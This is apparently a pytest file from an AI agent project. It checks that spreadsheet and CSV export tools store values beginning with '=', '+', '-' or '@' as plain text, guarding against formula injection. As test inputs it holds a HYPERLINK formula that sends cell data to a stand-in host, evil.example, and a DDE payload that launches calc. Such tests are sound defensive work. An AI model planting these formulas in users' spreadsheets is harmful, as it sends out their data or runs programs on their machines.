"""B19: text that starts with `=` is saved as text, never as a live formula.

Cells copied from web pages, or written by the model after reading one, reach
the user's spreadsheet. A formula there runs when they open it (`=HYPERLINK`
or `=WEBSERVICE` to send data out, DDE to start programs). An Atlas writer
therefore never creates a formula; the text stays visible as written.
"""

from __future__ import annotations

import csv
import subprocess
import sys
from pathlib import Path

import pytest
from openpyxl import Workbook, load_workbook

from agent.extension.table_export import write_table
from agent.tools.documents.blocks import set_xlsx_cell
from agent.tools.documents.create import create

ROOT = Path(__file__).resolve().parents[1]
EVIL = '=HYPERLINK("https://evil.example/?d="&A1,"click")'


def _cells(path: Path) -> list:
    wb = load_workbook(path)
    return [c for ws in wb.worksheets for row in ws.iter_rows() for c in row if c.value is not None]


def _no_formulas(path: Path) -> None:
    cells = _cells(path)
    assert [c.coordinate for c in cells if c.data_type == "f"] == []
    assert EVIL in [c.value for c in cells]          # still there, as text


def test_create_document_writes_text(tmp_path) -> None:
    path = tmp_path / "out.xlsx"
    create(path, f"| name | note |\n|---|---|\n| a | {EVIL} |\n| b | =1+1 |")
    _no_formulas(path)
    assert {c.value: c.data_type for c in _cells(path)}["=1+1"] == "s"


def test_set_cell_does_not_turn_text_into_a_formula(tmp_path) -> None:
    src = tmp_path / "in.xlsx"
    wb = Workbook()
    ws = wb.active
    assert ws is not None
    ws["A1"] = "total: PLACEHOLDER"
    ws["A2"] = "=1+1"                                  # the user's own formula
    wb.save(src)
    set_xlsx_cell(src, src, "A1", EVIL)
    cells = {c.coordinate: c for c in _cells(src)}
    assert cells["A1"].value == EVIL and cells["A1"].data_type == "s"
    assert cells["A2"].data_type == "f"                # left as it was


def test_saved_web_table_xlsx_writes_text(tmp_path) -> None:
    path = write_table([["name", "link"], ["a", EVIL], ["b", "12"]], "t", "", "xlsx", str(tmp_path))
    _no_formulas(path)


@pytest.mark.parametrize("value", [EVIL, "+cmd|' /C calc'!A0", "@SUM(1)", "-2+3"])
def test_saved_web_table_csv_is_neutralised(tmp_path, value) -> None:
    """A spreadsheet opening a CSV treats `=`, `+`, `-` and `@` as a formula."""
    path = write_table([["v"], [value], ["-5"]], "t", "", "csv", str(tmp_path))
    with path.open(encoding="utf-8-sig", newline="") as fh:
        rows = list(csv.reader(fh))
    assert rows[1] == ["'" + value]
    assert rows[2] == ["-5"]                           # a negative number stays a number


def test_combine_xlsx_writes_text(tmp_path) -> None:
    src = tmp_path / "in.csv"
    with src.open("w", newline="", encoding="utf-8") as fh:
        csv.writer(fh).writerows([["name", "link"], ["a", EVIL]])
    out = tmp_path / "out.xlsx"
    script = ROOT / "skills" / "xlsx" / "scripts" / "combine_xlsx.py"
    for stack in ([], ["--stack"]):
        r = subprocess.run([sys.executable, str(script), str(out), str(src), *stack],
                           capture_output=True, text=True, cwd=tmp_path)
        assert r.returncode == 0, r.stdout + r.stderr
        _no_formulas(out)
        out.unlink()
